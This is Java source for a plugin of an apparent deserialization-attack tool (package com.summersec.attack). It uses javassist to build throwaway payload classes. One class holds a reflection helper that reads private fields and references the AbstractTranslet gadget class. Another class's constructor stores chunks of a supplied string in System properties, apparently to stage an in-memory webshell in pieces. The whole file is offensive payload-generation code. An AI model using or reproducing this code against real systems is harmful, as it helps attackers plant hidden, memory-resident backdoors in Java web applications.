package com.summersec.attack.deser.plugins;

import com.summersec.attack.deser.echo.EchoPayload;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.CtNewConstructor;

public class ChunkedMemTool implements EchoPayload {
    @Override
    public CtClass genPayload(ClassPool pool) throws Exception {
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
//        classPool.appendClassPath(AbstractTranslet);
        CtClass clazz = pool.makeClass("com.summersec.x.Test" + System.nanoTime());
        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }
        clazz.addMethod(CtMethod.make("    private static Object getFV(Object o, String s) throws Exception {\n        java.lang.reflect.Field f = null;\n        Class clazz = o.getClass();\n        while (clazz != Object.class) {\n            try {\n                f = clazz.getDeclaredField(s);\n                break;\n            } catch (NoSuchFieldException e) {\n                clazz = clazz.getSuperclass();\n            }\n        }\n        if (f == null) {\n            throw new NoSuchFieldException(s);\n        }\n        f.setAccessible(true);\n        return f.get(o);\n}", clazz));

        clazz.addConstructor(CtNewConstructor.make("", clazz));

        return clazz;
    }

    @Override
    public CtClass genPayload(ClassPool paramClassPool, String bytestr) throws Exception {
        return null;
    }

    public CtClass genPayload(ClassPool pool, int num, String group) throws Exception {
        CtClass clazz = pool.makeClass("com.summersec.x.Test" + System.nanoTime());


        if ((clazz.getDeclaredConstructors()).length != 0) {
            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);
        }

        String constructorCode =
                "    public InjectMemTool() {\n" +
                        "        try {\n" +
                        "            System.setProperty(\"" + num + "\", \"" + escapeString(group) + "\");\n" +
                        "        } catch (Exception e) {\n" +
                        "            ;\n" +
                        "        }\n" +
                        "    }";
        clazz.addConstructor(CtNewConstructor.make(constructorCode, clazz));

        return clazz;
    }
    private String escapeString(String input) {
        return input.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }
}
